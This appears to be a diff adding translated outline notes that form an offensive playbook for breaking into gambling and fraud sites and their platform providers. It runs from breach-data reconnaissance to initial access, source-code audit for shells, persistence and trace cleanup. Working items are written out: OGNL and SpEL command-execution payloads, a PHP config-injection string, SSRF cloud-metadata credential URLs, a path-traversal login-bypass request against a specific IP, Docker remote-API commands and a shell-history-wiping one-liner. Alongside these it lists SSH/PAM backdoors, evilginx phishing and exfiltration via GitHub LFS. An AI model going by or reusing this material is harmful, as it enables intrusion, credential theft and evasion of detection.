+<h3 id="website-reconnaissance">Website Reconnaissance</h3>
+<h4 id="sgk-data-source-collection">SGK data source collection</h4>
+<ul>
+<li><a href="https://breachforums.st/member?action=login">https://breachforums.st/member?action=login</a></li>
+<li>potato</li>
+<li>BatChat</li>
+<li>Seagull</li>
+<li>Shimida</li>
+<li>tg</li>
+<li>Buy temporary accounts to farm SGK query credits</li>
+<li>signal</li>
+<li>discord</li>
+<li>whatsapp</li>
+<li>Jabber</li>
+<li>session</li>
+<li>matrix</li>
+<li>simplex</li>
+</ul>
+<h4 id="what-to-look-at-once-you-have-a-site">What to Look at Once You Have a Site</h4>
+<ul>
+<li>Use paramspider to build wordlists</li>
+<li>to do</li>
+</ul>
+<h4 id="open-source-reconnaissance">Open-Source Reconnaissance</h4>
+<ul>
+<li>github</li>
+<li>Keywords<ul>
+<li>ldap</li>
+<li>Combine with domain asset information<ul>
+<li>Internal network asset information</li>
+</ul>
+</li>
+<li>login</li>
+<li>Small businesses</li>
+<li>Project linkage -&gt; information under the account</li>
+<li>Pinyin (abbreviations)</li>
+<li>Subdomains</li>
+<li>Internal domain names</li>
+<li>com.xxx</li>
+<li>Chinese</li>
+<li>js/css/html/special filenames</li>
+</ul>
+</li>
+<li>Person linkage<ul>
+<li>star</li>
+<li>fork</li>
+<li>commit</li>
+<li>follow</li>
+</ul>
+</li>
+<li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
+<li>Subdomains</li>
+<li>fofa/hunter/...</li>
+<li>ico</li>
+<li>title</li>
+<li>body</li>
+<li>Find source code<ul>
+<li>Scan for backups</li>
+<li>Black-box -&gt; white-box</li>
+</ul>
+</li>
+<li>gitee/Kancloud/Yuque/<a href="http://hackmd.io/石墨">hackmd.io/Shimo</a></li>
+<li>site:"<a href="http://yuque.com">yuque.com</a>" "xxx"</li>
+<li>News</li>
+<li><a href="https://sigma.world/zh-hant/cis/floor-plan/">https://sigma.world/zh-hant/cis/floor-plan/</a></li>
+<li>Google dorks</li>
+<li>duckduckgo<ul>
+<li>site:<a href="http://xxx.com">xxx.com</a> -www -fare -css -parking</li>
+</ul>
+</li>
+<li>hackone/<a href="https://zeroday.hitcon.org/">https://zeroday.hitcon.org/</a></li>
+<li>Twitter/facebook/linkin</li>
+<li>Employees<ul>
+<li>Initial passwords follow a pattern</li>
+</ul>
+</li>
+<li>Cloud drives</li>
+<li>Third-party</li>
+<li>medium</li>
+<li>Not mandatory<ul>
+<li>Get a membership</li>
+</ul>
+</li>
+</ul>
+<h4 id="supply-chain-reconnaissance">Supply Chain Reconnaissance</h4>
+<ul>
+<li>Supplier conferences</li>
+<li>Overseas enterprises</li>
+<li>Bidding and tendering</li>
+<li>Page fingerprints</li>
+<li>js/css/html</li>
+</ul>
+<h4 id="osint-reconnaissance">OSINT Reconnaissance</h4>
+<ul>
+<li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
+<li><a href="https://search.censys.io/">https://search.censys.io/</a></li>
+<li>Scans ports daily<ul>
+<li>Very timely</li>
+<li>But occasionally misses things, not complete</li>
+</ul>
+</li>
+<li>rapid7 dns</li>
+<li>Set up ClickHouse locally</li>
+<li><a href="https://idc.ip138.com/idc/">https://idc.ip138.com/idc/</a></li>
+<li>asn</li>
+<li>Page fingerprints to find source code</li>
+<li>API fingerprints to find source code</li>
+<li>Contact information to find source code</li>
+</ul>
+<h4 id="bypass-cdn">Bypass CDN</h4>
+<ul>
+<li>Page fingerprints to find the real IP</li>
+<li>Historical DNS resolution to find the real IP</li>
+<li>IP ranges of related businesses to find the real IP</li>
+</ul>
+<h3 id="practical-attribution-of-site-building-companies">Practical Attribution of Site-Building Companies</h3>
+<h4 id="attribution-of-gambling-white-label-platform-providers">Attribution of Gambling White-Label Platform Providers</h4>
+<ul>
+<li>Same CDN</li>
+<li>Same DNS</li>
+<li>Same data center</li>
+<li>Same page fingerprints to find test-site domain/IP linked to the platform provider</li>
+<li>Fuzzy search on same-keyword-feature domains</li>
+<li>Find customer support to match templates</li>
+</ul>
+<h4 id="attribution-of-gang-member-information">Attribution of Gang Member Information</h4>
+<ul>
+<li>Historical posts linked to accounts</li>
+<li>Special IDs</li>
+<li>sgk</li>
+<li>File metadata</li>
+<li>Phishing</li>
+</ul>
+<h3 id="penetration-strike-breakthrough-ideas-and-methods">Penetration-Strike Breakthrough Ideas and Methods</h3>
+<h4 id="black-box-rapid-initial-access-approach">Black-Box Rapid Initial-Access Approach</h4>
+<ul>
+<li>Gambling sites</li>
+<li>_<ul>
+<li>Penetration testing</li>
+<li>Identify the version</li>
+<li>Set up locally</li>
+<li>Tools<ul>
+<li>Vulnerabilities</li>
+<li>Vulnerabilities require permissions</li>
+<li>Vulnerability principles</li>
+<li>Packet capture</li>
+<li>Modify yourself</li>
+</ul>
+</li>
+<li>Reconnaissance</li>
+<li>Vulnerability accumulation</li>
+<li><a href="https://ot8oa9a41m.feishu.cn/docx/IfLOdfra7oxJrHxHB6qc7Dx8nux">Vulnerability accumulation</a></li>
+</ul>
+</li>
+<li>Promo sites<ul>
+<li>Injection</li>
+<li>Modify sqlmap<ul>
+<li>Specified database, specified table</li>
+<li>Remove all probe content</li>
+</ul>
+</li>
+<li>Backup files</li>
+<li>Framework vulnerabilities</li>
+<li>RCE/deserialization vulnerabilities</li>
+<li>Upload</li>
+<li>Arbitrary file read/write</li>
+<li>github\google</li>
+<li><a href="https://xvi.vulbox.com/">https://xvi.vulbox.com/</a></li>
+<li>Temporary setups</li>
+<li>After compromise, dig through files for lateral movement<ul>
+<li>mq</li>
+<li>Phishing</li>
+</ul>
+</li>
+<li>Before</li>
+<li>Sold as a package<ul>
+<li>Easy to search</li>
+<li>Together with the actual site</li>
+</ul>
+</li>
+<li>Rare</li>
+<li>Collect domain assets for further expansion</li>
+<li>Multiple platform-provider sub-sites share one promo site</li>
+<li>Use platform-provider-related domains</li>
+</ul>
+</li>
+<li>Customer-service sites<ul>
+<li>xss</li>
+<li>Phishing</li>
+<li>electron rce</li>
+<li>Self-built from purchased source code</li>
+<li>markdown<ul>
+<li>Tags</li>
+</ul>
+</li>
+<li>Find the customer-service vendor's demo site and source code</li>
+<li>Find the admin panel</li>
+<li>Directory scan</li>
+<li>Attribute platform-provider assets via customer-service site assets</li>
+<li>94chat</li>
+<li>Social-engineer customer support for more site information</li>
+<li>Taking the customer-service site does not yield core data</li>
+</ul>
+</li>
+<li>Page fingerprints to find related sites<ul>
+<li>js</li>
+<li>js console</li>
+<li>Static resource loading</li>
+<li>wss</li>
+<li>Unreliable</li>
+</ul>
+</li>
+<li>Attack the platform provider<ul>
+<li>Ops services</li>
+<li>Jenkins</li>
+<li>Various domestic OA management software</li>
+<li>mq</li>
+<li>Test sites</li>
+<li>Weak passwords</li>
+<li>getshell<ul>
+<li>Lateral</li>
+<li>Malware/phishing</li>
+<li>yun<ul>
+<li>Client machines</li>
+</ul>
+</li>
+<li>Grab source code</li>
+<li>Error debugging</li>
+</ul>
+</li>
+<li>Collect admin-panel APIs<ul>
+<li>../../</li>
+</ul>
+</li>
+<li>Source-code resellers<ul>
+<li>Briefly chat</li>
+<li>Scan backups</li>
+<li>Black-box</li>
+<li>Find more page fingerprints from admin-panel page resources</li>
+<li>money.php</li>
+<li>Admin-panel debug errors<ul>
+<li>Special database table names, filenames</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Historical edge assets</li>
+<li>Platform providers are hard to find</li>
+<li>bbscan to find backups for quick code audit</li>
+<li>Backups only apply to this site<ul>
+<li>Admin API, backend filenames</li>
+</ul>
+</li>
+<li>Is privilege escalation meaningful?</li>
+<li>When the admin panel has multiple admin accounts</li>
+<li>Vertical privilege escalation<ul>
+<li>More API permissions</li>
+</ul>
+</li>
+<li>Horizontal privilege escalation<ul>
+<li>Whole site</li>
+</ul>
+</li>
+<li>Reconnaissance, black-box, white-box, internal network<ul>
+<li>Attack target</li>
+<li>Clear division of roles</li>
+<li>Corporate employees</li>
+<li>Complete a target end-to-end independently</li>
+<li>CaA</li>
+<li>Burp, Yakit</li>
+<li>cpacha_killer_modify</li>
+<li>When Burp can't capture traffic because its fingerprint is detected, modify TLS</li>
+<li>Choose the basic one</li>
+<li>PoC verification<ul>
+<li>Scanner development</li>
+<li>Try not to carry attack signatures</li>
+<li>Make request payloads harmless</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>What is the target<ul>
+<li>Compromise the white-label platform</li>
+<li>Control all data</li>
+<li>Rights protection</li>
+<li>Supply chain<ul>
+<li>Customer credentials and payment info</li>
+</ul>
+</li>
+<li>Console sub-permissions</li>
+<li>Obtain source code</li>
+<li>Control ops and dev, at worst control customer service</li>
+<li>Whether to control customers further down<ul>
+<li>2FA verification</li>
+<li>Bind HTTPS</li>
+<li>Google Authenticator</li>
+<li>Phone binding</li>
+<li>Microsoft Authenticator</li>
+<li>IP whitelist</li>
+<li>XFF header</li>
+<li>If vulnerable, modify config</li>
+<li>Login IP</li>
+<li>Chrome remote debug</li>
+<li>Cookie/storage</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Fourth-party payment / external platforms (switched target)<ul>
+<li>Login proxy</li>
+<li>Username varies</li>
+<li>Loaded assets change</li>
+<li>New domain characteristics can't be correlated back to the origin server</li>
+<li>Find the framework</li>
+<li>Find assets</li>
+<li>Find vulnerabilities</li>
+</ul>
+</li>
+<li>The big get bigger, the small get smaller<ul>
+<li>Buy a gambling license (registration)</li>
+<li>Formalize, incorporate, scale up<ul>
+<li>Azure</li>
+<li>Cloud applications</li>
+<li>High difficulty, high time cost</li>
+<li>Long prison terms, dampens motivation</li>
+</ul>
+</li>
+<li>The original operation was compromised</li>
+<li>Sell source code<ul>
+<li>Outdated</li>
+<li>Frontend unreliable<ul>
+<li>Backend code was modified</li>
+<li>uniapp frontend<ul>
+<li>Hired private developers</li>
+<li>Backend | API | filename xxx.php</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Code incomplete</li>
+<li>The dumped code<ul>
+<li>Not fully decrypted</li>
+</ul>
+</li>
+<li>Logic has issues</li>
+<li>Collector<ul>
+<li>Legitimate data collection</li>
+<li>Add lottery types and rounds you can control</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Credit platform | Casino<ul>
+<li>Main target</li>
+</ul>
+</li>
+<li>QB<ul>
+<li>6-month trial period</li>
+<li>Compromise and maintain long-term persistence</li>
+</ul>
+</li>
+<li>Blockchain<ul>
+<li>Web3</li>
+<li>Pig-butchering scam</li>
+<li>BTC gambling games</li>
+</ul>
+</li>
+<li>TG bot</li>
+<li>The original boss quit<ul>
+<li>His people resell it</li>
+<li>Originally had few vulnerabilities</li>
+<li>Does the source code have backdoors</li>
+</ul>
+</li>
+<li>Micro-trading platform<ul>
+<li>Refined chat</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>cp</li>
+<li>Injection<ul>
+<li>SQL injection in the betting flow</li>
+<li>Connects to external lottery APIs, the main site is self-hosted</li>
+<li>Frontend/backend encryption</li>
+<li>Check-in injection</li>
+<li>Roulette event</li>
+<li>orderby=rand(1=1)</li>
+</ul>
+</li>
+<li>Customer service site<ul>
+<li>Invitation code</li>
+<li>53</li>
+<li>meiqia</li>
+</ul>
+</li>
+<li>Directory site</li>
+<li>Chat room<ul>
+<li>XSS</li>
+<li>ws</li>
+<li>Locate the white-label platform</li>
+</ul>
+</li>
+<li>Image site<ul>
+<li>Locate the white-label platform</li>
+<li><a href="http://img.xxx.com">img.xxx.com</a></li>
+<li>Management system</li>
+</ul>
+</li>
+<li>Editor<ul>
+<li>Arbitrary file upload</li>
+<li>XSS</li>
+<li>ueiditor</li>
+<li>PHP<ul>
+<li>SSRF</li>
+<li>Internal network live ports</li>
+<li>Real IP<ul>
+<li>DNS</li>
+<li>176.xxxx</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>dotnet<ul>
+<li>Upload</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Points system<ul>
+<li>Abandoned</li>
+</ul>
+</li>
+<li>Demo site<ul>
+<li>Compromise the source code</li>
+</ul>
+</li>
+<li>Error messages<ul>
+<li>JSON closing</li>
+<li>Array of variable names</li>
+<li>word[]=xxx<ul>
+<li>java \ php \ middleware</li>
+<li>cf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Multiple ports<ul>
+<li>High ports running other services</li>
+<li>Real IP</li>
+<li>Bound to different domains</li>
+<li>nginx reverse proxy</li>
+<li>80-30000+</li>
+</ul>
+</li>
+<li>Set up BaoTa / HuWeiShen<ul>
+<li>Lab practice</li>
+<li>Injection</li>
+<li>Upload</li>
+<li>Change password</li>
+<li>Shut down services</li>
+</ul>
+</li>
+<li>Dump the database<ul>
+<li>adminer</li>
+<li>Transfer to the server in chunks</li>
+<li>Web directory</li>
+<li>GitHub LFS<ul>
+<li>Action</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Deserialization<ul>
+<li>CI</li>
+<li><a href="https://guokeya.github.io/post/lQXYmp8_4/">https://guokeya.github.io/post/lQXYmp8_4/</a></li>
+<li>gzip test.phar</li>
+</ul>
+</li>
+<li>Mainstream domestic domains<ul>
+<li>Common SRCs</li>
+<li>Gambling sites, fraud sites</li>
+<li>Collected in bulk via signatures</li>
+<li>Crawler</li>
+<li>Build wordlists</li>
+</ul>
+</li>
+<li>zp</li>
+<li>Quick initial access on this site<ul>
+<li>Directories</li>
+<li>Ports</li>
+<li>Weak credentials</li>
+<li>bbscan to find backups, quick code audit</li>
+<li>Avatar upload</li>
+<li>Voice Moments upload</li>
+<li>Phishing<ul>
+<li>SH</li>
+</ul>
+</li>
+<li>Nude chat, same-city free</li>
+<li>Task-based order brushing</li>
+</ul>
+</li>
+<li>n websites<ul>
+<li>1-2 months</li>
+</ul>
+</li>
+<li>Half year to 1 year</li>
+<li>PHP<ul>
+<li>Variable overwrite</li>
+</ul>
+</li>
+<li>Routes<ul>
+<li>filter, WAF,</li>
+<li>Extract and run a scan</li>
+</ul>
+</li>
+<li>Vulnerability points<ul>
+<li>Config files</li>
+<li>Hardcoded<ul>
+<li>Cookie forgery</li>
+</ul>
+</li>
+<li>Dangerous functions</li>
+<li>Debug<ul>
+<li>Black Lily</li>
+</ul>
+</li>
+<li>How to trigger and what conditions are needed</li>
+<li>Routes</li>
+<li>Permissions</li>
+</ul>
+</li>
+<li>Temporarily buy a server<ul>
+<li>RAM</li>
+<li>Must bind MFA<ul>
+<li><a href="https://auth.ping8.top/">https://auth.ping8.top/</a></li>
+<li>Export username: secret</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="common-vulnerability-principles-and-exploitation-tools-and-approaches">Common Vulnerability Principles and Exploitation Tools and Approaches</h4>
+<ul>
+<li>Exploitation approach</li>
+<li>Components<ul>
+<li>Source code</li>
+<li>Open source</li>
+<li>Backup</li>
+<li>Trick the customer service / test site</li>
+<li>Cloud storage leaks</li>
+<li>Test multiple versions</li>
+<li>Commercial version needs cracking<ul>
+<li>Encryption/decryption</li>
+</ul>
+</li>
+<li>PHP vulnerabilities</li>
+<li>23, 24<ul>
+<li>cgi-bin</li>
+<li>XAMPP</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Version<ul>
+<li>Update time</li>
+<li>Fix logs</li>
+<li>How was it fixed? Bypass it</li>
+<li>Affected scope</li>
+<li>Differences between commercial and open-source versions</li>
+<li>hw</li>
+</ul>
+</li>
+<li>Obtaining PoC<ul>
+<li>GitHub</li>
+<li>Blogs</li>
+<li>Analyze source code yourself</li>
+<li>No exploit released<ul>
+<li>Analyze the patch yourself</li>
+</ul>
+</li>
+<li>Extract via packet capture with tools</li>
+</ul>
+</li>
+<li>Principles<ul>
+<li>Vulnerability points</li>
+<li>Exploitation conditions</li>
+<li>Adverse consequences</li>
+<li>Request routes</li>
+<li>Secondary development</li>
+</ul>
+</li>
+<li>Real-world adaptation<ul>
+<li>Set up local environment</li>
+<li>No outbound connection</li>
+<li>.net core</li>
+<li>Memory shell</li>
+</ul>
+</li>
+<li>Common vulnerabilities</li>
+<li>SQL injection<ul>
+<li>Don't use sqlmap</li>
+<li>Write your own script</li>
+<li>Whether web and DB are separated</li>
+<li>Whether write permission is available</li>
+<li>Whether command execution is possible</li>
+<li>oracle<ul>
+<li>19c</li>
+<li>sys</li>
+</ul>
+</li>
+<li>If uncrackable, write admin credentials or config parameters (file type) or rewrite the key</li>
+<li>Bcrypt</li>
+<li>Uploaded file type</li>
+<li><a href="https://github.com/r0oth3x49/ghauri">https://github.com/r0oth3x49/ghauri</a></li>
+</ul>
+</li>
+<li>Arbitrary file read<ul>
+<li>Read sensitive files</li>
+<li>Can you list directories</li>
+<li>Can Windows cross drive letters</li>
+<li>.bash_history</li>
+<li>.viminfo</li>
+<li>Source code, config files, logs, startup scripts</li>
+<li>/proc/net/</li>
+<li>/proc/self/</li>
+<li>/proc/pid/</li>
+</ul>
+</li>
+<li>Arbitrary file upload<ul>
+<li>Directories</li>
+<li>Whether the directory is returned</li>
+<li>/var/www/<a href="http://www.xxx.com/img/xxx.php">www.xxx.com/img/xxx.php</a><ul>
+<li><a href="http://www.xxx.com/limg/xxx.php">www.xxx.com/limg/xxx.php</a></li>
+</ul>
+</li>
+<li>Upload to OSS</li>
+<li>Upload local | cross drive letters</li>
+<li>Combined with arbitrary file inclusion</li>
+</ul>
+</li>
+<li>Docker<ul>
+<li>Determine the environment</li>
+<li>.dockerenv |ls -alh /.dockerenv|cat /proc/1/cgroup|mount | grep "docker"|fdisk -l|ps -aux</li>
+<li>cat /proc/self/status | grep Cap</li>
+<li>Privileged mode to mount the host</li>
+<li>0000003fffffffff</li>
+<li>Registry API unauthorized access exploitation</li>
+<li><a href="https://github.com/Soufaker/docker_v2_catalog">https://github.com/Soufaker/docker_v2_catalog</a></li>
+<li>Remote API unauthorized access</li>
+<li>2375<ul>
+<li>docker -H tcp://<target>:2375 ps -a</li>
+</ul>
+</li>
+<li><a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></li>
+<li><a href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></li>
+</ul>
+</li>
+<li>SSRF<ul>
+<li><a href="http://100.100.100.200/latest/meta-data">http://100.100.100.200/latest/meta-data</a></li>
+<li><a href="http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role">http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role</a></li>
+<li><a href="http://metadata.tencentyun.com/latest/meta-data/">http://metadata.tencentyun.com/latest/meta-data/</a></li>
+<li>OSS Browser, CF</li>
+<li><a href="https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html">https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html</a></li>
+</ul>
+</li>
+<li>PHP config file write<ul>
+<li>'); phpinfo(); /*</li>
+<li>Variable overwrite</li>
+</ul>
+</li>
+<li>How to proceed with only a login page<ul>
+<li>Classic interview question</li>
+<li>Tests divergent thinking</li>
+<li>IP</li>
+<li>Domain</li>
+<li>Google search for historical articles mentioning the site</li>
+<li>wayurl</li>
+<li>JS \ directories \ interfaces \ parameter brute-force (arjun, hae)</li>
+<li>Injection</li>
+<li>.net</li>
+<li>Registration</li>
+<li>Find login scripts on GitHub</li>
+<li>Brute-force JWT</li>
+<li>Help docs</li>
+<li><a href="https://github.com/cws001/swagger-exp-knife4j">https://github.com/cws001/swagger-exp-knife4j</a></li>
+</ul>
+</li>
+<li>TP<ul>
+<li>Tools</li>
+<li><a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a></li>
+<li>Logs</li>
+<li>Debug</li>
+<li>RCE</li>
+<li>High versions</li>
+<li>Multi-language</li>
+<li>Docker</li>
+<li>Injection</li>
+<li>3.2.3, 3.2.5</li>
+</ul>
+</li>
+<li>Telegram reconnaissance<ul>
+<li>Phishing pages</li>
+<li>LinkedIn<ul>
+<li>Email</li>
+<li>Phone</li>
+</ul>
+</li>
+<li>evilginx</li>
+</ul>
+</li>
+<li>Collect white-label platform intel<ul>
+<li>Philippines, Taiwan</li>
+</ul>
+</li>
+<li>SSH backdoor</li>
+<li>tsh<ul>
+<li>Internal network machines</li>
+<li>Produce outbound connections</li>
+<li>The VPS machine must not go down</li>
+</ul>
+</li>
+<li>PAM<ul>
+<li>Test the version well</li>
+<li>Keep the connection stable, must not drop</li>
+</ul>
+</li>
+<li><a href="https://github.com/9bie/sshdHooker">https://github.com/9bie/sshdHooker</a></li>
+<li>Find files</li>
+<li><a href="https://github.com/AabyssZG/FindEverything">https://github.com/AabyssZG/FindEverything</a><ul>
+<li>Extend it into a version you like</li>
+</ul>
+</li>
+<li>Trace removal</li>
+<li>Windows<ul>
+<li><a href="https://github.com/r00tSe7en/ShadowlessFeet">https://github.com/r00tSe7en/ShadowlessFeet</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="trace-cleanup">Trace cleanup</h4>
+<ul>
+<li>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</li>
+<li>Modify file timestamps</li>
+<li>Internal network discovery logic</li>
+<li>Strictly no scanning inside the internal network</li>
+<li>Access the internal network according to machine logic</li>
+<li>Discover the internal network via existing connections</li>
+<li>Script tasks</li>
+<li>Single-threaded</li>
+<li>Scan a single port</li>
+<li>Randomized IP addresses</li>
+<li>Random delay after scanning</li>
+</ul>
+<h2 id="code-audit">**Code Audit **</h2>
+<h3 id="hands-on-java-code-audit">Hands-on Java Code Audit</h3>
+<h4 id="bc-site-source-code-audit-for-getshell-hands-on">BC Site Source-Code Audit for Getshell (Hands-on)</h4>
+<ul>
+<li>pom</li>
+<li>SQL injection<ul>
+<li>mybatis</li>
+<li>Strict typing</li>
+<li>order by ${time}</li>
+<li>LIKE '%${stuName}%'</li>
+<li>in (${id})</li>
+<li>Directly invoked statements</li>
+<li>OGNL injection<ul>
+<li><select id="getUserByUserName" parameterType="String" resultMap="User">    select * from users where username like ${username}&lt;/select</li>
+<li>OgnlCache.getValue</li>
+<li><strong>parseExpression</strong><ul>
+<li>${@java.lang.Runtime@getRuntime().exec("whoami")}</li>
+<li>${@java.lang.Thread@currentThread().sleep(9000L)}</li>
+</ul>
+</li>
+<li><a href="https://commons.apache.org/dormant/commons-ognl/language-guide.html">https://commons.apache.org/dormant/commons-ognl/language-guide.html</a></li>
+<li><a href="https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md">https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Deserialization<ul>
+<li>fastjson</li>
+<li>Even if not exploitable, confirm the CC chain exists</li>
+<li>shiro</li>
+<li>log4j</li>
+<li>Determine which gadget chain is exploitable from dependencies and versions</li>
+<li>So-called tool familiarity</li>
+<li>Understand the vulnerability principle</li>
+<li>Have a PoC</li>
+<li>Can modify the PoC (gadget chain)</li>
+<li>JasperReports</li>
+</ul>
+</li>
+<li>SSTI template injection<ul>
+<li>thymeleaf</li>
+<li><a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a><ul>
+<li>$</li>
+<li>*</li>
+<li>~</li>
+</ul>
+</li>
+<li>SpEL expression execution<ul>
+<li><a href="https://itmyhome.com/spring/expressions.html">https://itmyhome.com/spring/expressions.html</a></li>
+<li>Prerequisites</li>
+<li>The incoming expression is unfiltered</li>
+<li>getValue/setValue is called after expression parsing</li>
+<li>Uses StandardEvaluationContext (default) as the context object</li>
+</ul>
+</li>
+<li><strong>$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d</strong>::.x<ul>
+<li>templateName</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Component weak credentials / unauthorized access<ul>
+<li>durid</li>
+<li>Unauthorized access</li>
+<li>rce</li>
+<li>swagger-ui</li>
+<li>xxl-job</li>
+</ul>
+</li>
+<li>Component versions</li>
+<li>Functional modules</li>
+<li>filter</li>
+<li>Vulnerabilities leading to directory traversal<ul>
+<li>Unauthorized access</li>
+</ul>
+</li>
+<li>xss</li>
+<li>Routing</li>
+<li>Combine black-box and white-box approaches to enumerate unauthorized endpoints<ul>
+<li>Simply analyze status codes</li>
+</ul>
+</li>
+<li>LICENSE</li>
+<li>Identify the framework</li>
+<li>Map out functional modules</li>
+<li>Login functionality</li>
+<li>Login bypass<ul>
+<li>GET /api/admin/login/../../../api/userBill/export  HTTP/1.1Host: 3.1.181.69:8080Accept: application/json, text/plain, <em>/</em>x-api-idempotent: bfe3cd31-cf0c-4ac5-a1ba-f9886f5b556dAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36Referer: <a href="http://3.1.181.69:8080/Accept-Encoding:">http://3.1.181.69:8080/Accept-Encoding:</a> gzip, deflate, brConnection: keep-alive</li>
+</ul>
+</li>
+<li>Hardcoded secrets<ul>
+<li>Inspect the token and cookie generation logic</li>
+<li>Forge tokens and cookies</li>
+</ul>
+</li>
+<li>Weak randomness (same approach across languages)<ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html">https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html</a></li>
+<li>django-simple-captcha<ul>
+<li>With the same seed, two random-number draws are identical</li>
+<li>random.seed() sets a seed that applies to the whole process. In other words, if we set the random seed through a captcha request, a subsequent password-recovery request that passes through the same process will use our seed to generate random numbers</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Unauthorized and permission-controllable endpoint functions</li>
+<li>Upload</li>
+<li>Injection<ul>
+<li><a href="https://www.yangdx.com/2022/05/211.html">https://www.yangdx.com/2022/05/211.html</a></li>
+</ul>
+</li>
+<li>xxe<ul>
+<li>Can it achieve RCE?</li>
+<li>file ftp mailto http https jar netdoc</li>
+</ul>
+</li>
+<li>File operations</li>
+<li>ssrf</li>
+<li>Crude WAF rules</li>
+<li>Usually in the filter<ul>
+<li>Lax rules allow WAF bypass</li>
+<li>Find endpoints not covered by the filter rules</li>
+</ul>
+</li>
+<li><a href="https://blog.csdn.net/sdnuwjw/article/details/103536816">https://blog.csdn.net/sdnuwjw/article/details/103536816</a></li>
+</ul>
+<h4 id="cp-site-source-code-audit-for-getshell-hands-on">CP Site Source-Code Audit for Getshell (Hands-on)</h4>
+<ul>
+<li>Online decompilation</li>
+<li><a href="http://www.javadecompilers.com/">http://www.javadecompilers.com/</a></li>
+<li><a href="http://www.decompiler.com/">http://www.decompiler.com/</a></li>
+<li><a href="https://devtoolzone.com/decompiler/java">https://devtoolzone.com/decompiler/java</a></li>
+<li><a href="https://jdec.herokuapp.com/">https://jdec.herokuapp.com/</a></li>
+<li><a href="https://www.mobilefish.com/services/java_decompiler/java_decompiler.php">https://www.mobilefish.com/services/java_decompiler/java_decompiler.php</a></li>
+<li><a href="http://javare.cn/">http://javare.cn/</a></li>
+<li>Quickly find keywords</li>
+<li><a href="https://github.com/Ppsoft1991/CodeReviewTools">https://github.com/Ppsoft1991/CodeReviewTools</a></li>
+<li><a href="https://github.com/4ra1n/code-inspector">https://github.com/4ra1n/code-inspector</a></li>
+<li><a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></li>
+<li><a href="https://github.com/ax1sX/RouteCheck-Alpha">https://github.com/ax1sX/RouteCheck-Alpha</a></li>
+<li>Hands-on case study (removed)</li>
+<li>After confirming the vulnerability, find live sites by route and page characteristics</li>
+<li><a href="https://github.com/blackorbird/APT_REPORT">https://github.com/blackorbird/APT_REPORT</a></li>
+<li><a href="https://github.com/timwhitez/Doge-DNSptr">https://github.com/timwhitez/Doge-DNSptr</a></li>
+<li><a href="https://github.com/bit4woo/knife">https://github.com/bit4woo/knife</a></li>
+</ul>
+<h4 id="java-deserialization">Java Deserialization</h4>
+<ul>
+<li>classloader</li>
+<li>BootStrap ClassLoader(-Xbootclasspath)<ul>
+<li>rt.jar</li>
+<li>java.lang, <a href="http://java.io/">java.io</a></li>
+<li>resources.jar</li>
+<li>charsets.jar</li>
+</ul>
+</li>
+<li>Ext ClassLoader(-D java.ext.dirs)</li>
+<li>App ClassLoader(-classpath)</li>
+<li>AppClassLoader's parent (not its superclass) is ExtClassLoader<ul>
+<li>AppClassLoader's class: class jdk.internal.loader.ClassLoaders$AppClassLoader</li>
+<li>ExtClassLoader's class: class jdk.internal.loader.ClassLoaders$PlatformClassLoader  // PlatformClassLoader in JDK 8+</li>
+<li>AppClassLoader's superclass: class jdk.internal.loader.URLClassLoader</li>
+<li>ExtClassLoader's superclass: class jdk.internal.loader.URLClassLoader</li>
+</ul>
+</li>
+<li>Both AppClassLoader and ExtClassLoader are member classes of the sun.misc.Launcher class</li>
+<li>Top parent loads -&gt; parent loads -&gt; fall back to local load when not found<ul>
+<li>Load in the current class -&gt; fall back to parent load when not found</li>
+<li>Custom ClassLoader<ul>
+<li>loadClass (loads the specified Java class): if a custom ClassLoader overrides loadClass, it breaks the parent delegation mechanism, because the parent delegation mechanism is implemented in loadClass.</li>
+<li>findClass (finds the specified Java class)</li>
+<li>findLoadedClass (finds a class already loaded by the JVM)</li>
